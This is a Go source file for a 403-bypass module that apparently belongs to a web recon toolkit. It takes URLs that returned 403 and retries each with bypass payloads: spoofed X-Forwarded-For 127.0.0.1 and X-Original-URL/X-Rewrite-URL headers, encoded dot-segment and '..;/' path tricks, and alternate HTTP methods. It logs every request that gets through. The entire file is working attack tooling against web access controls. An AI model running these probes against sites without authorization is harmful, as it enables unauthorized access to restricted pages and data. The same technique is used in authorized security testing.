package bypass403

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type payload struct {
	name    string
	headers func(u *url.URL) map[string]string
	path    string
	method  string
}

func Run(workDir string) error {
	inPath := filepath.Join(workDir, "high_interest_urls.txt")
	outPath := filepath.Join(workDir, "403_bypass_results.txt")

	file, err := os.Open(inPath)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return fmt.Errorf("failed to open high_interest_urls.txt: %w", err)
	}
	defer file.Close()

	out, err := os.Create(outPath)
	if err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}
	defer out.Close()
	writer := bufio.NewWriter(out)
	defer writer.Flush()

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	payloads := []payload{
		{"X-Forwarded-For", func(u *url.URL) map[string]string {
			return map[string]string{"X-Forwarded-For": "127.0.0.1"}
		}, "", "GET"},
		{"X-Original-URL", func(u *url.URL) map[string]string {
			return map[string]string{"X-Original-URL": u.Path}
		}, "", "GET"},
		{"X-Rewrite-URL", func(u *url.URL) map[string]string {
			return map[string]string{"X-Rewrite-URL": u.Path}
		}, "", "GET"},
		{"Referer", func(u *url.URL) map[string]string {
			return map[string]string{"Referer": u.String()}
		}, "", "GET"},
		{"Trailing-Slash", nil, "/", "GET"},
		{"Dot-Segment", nil, "/%2e/", "GET"},
		{"Double-Encoding", nil, "/%252e/", "GET"},
		{"Semicolon-Path", nil, "..;/", "GET"},
		{"HEAD-Method", nil, "", "HEAD"},
		{"POST-Method", nil, "", "POST"},
		{"PUT-Method", nil, "", "PUT"},
	}

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		if len(parts) < 2 {
			continue
		}
		rawURL := parts[0]
		status := strings.Trim(parts[1], "[]")

		if status != "403" {
			continue
		}

		parsedURL, err := url.Parse(rawURL)
		if err != nil {
			continue
		}

		for _, p := range payloads {
			testURL := rawURL
			if p.path != "" {
				if strings.Contains(testURL, "?") {
					idx := strings.Index(testURL, "?")
					testURL = testURL[:idx] + p.path + testURL[idx:]
				} else {
					testURL = testURL + p.path
				}
			}

			req, err := http.NewRequest(p.method, testURL, nil)
			if err != nil {
				continue
			}

			if p.headers != nil {
				for k, v := range p.headers(parsedURL) {
					req.Header.Set(k, v)
				}
			}

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			if resp.StatusCode != 403 {
				writer.WriteString(fmt.Sprintf("[%s] %s -> %d\n", p.name, testURL, resp.StatusCode))
			}
		}
	}

	return scanner.Err()
}
